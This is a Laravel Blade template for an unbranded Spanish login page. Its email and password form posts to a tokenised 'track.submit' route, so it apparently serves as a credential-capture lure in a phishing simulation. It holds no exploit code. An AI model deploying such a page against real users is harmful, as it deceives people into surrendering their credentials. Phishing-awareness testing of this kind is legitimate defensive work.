<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; background: #f0f2f5;
               display: flex; align-items: center; justify-content: center;
               min-height: 100vh; margin: 0; }
        .card { background: #fff; border-radius: 8px; padding: 40px;
                width: 360px; box-shadow: 0 2px 12px rgba(0,0,0,.12); }
        h2 { text-align: center; margin-bottom: 24px; color: #1a1a2e; }
        label { display: block; margin-bottom: 4px; font-size: .875rem; color: #555; }
        input { width: 100%; padding: 10px 12px; border: 1px solid #ddd;
                border-radius: 6px; font-size: 1rem; margin-bottom: 16px; }
        button { width: 100%; padding: 12px; background: #0066cc; color: #fff;
                 border: none; border-radius: 6px; font-size: 1rem; cursor: pointer; }
        button:hover { background: #0055aa; }
    </style>
</head>
<body>
<div class="card">
    <h2>Iniciar sesión</h2>
    <form action="{{ route('track.submit', $token) }}" method="POST">
        @csrf
        <label for="email">Email</label>
        <input type="email" id="email" name="email" placeholder="usuario@empresa.com">
        <label for="password">Contraseña</label>
        <input type="password" id="password" name="password" placeholder="••••••••">
        <button type="submit">Acceder</button>
    </form>
</div>
</body>
</html>
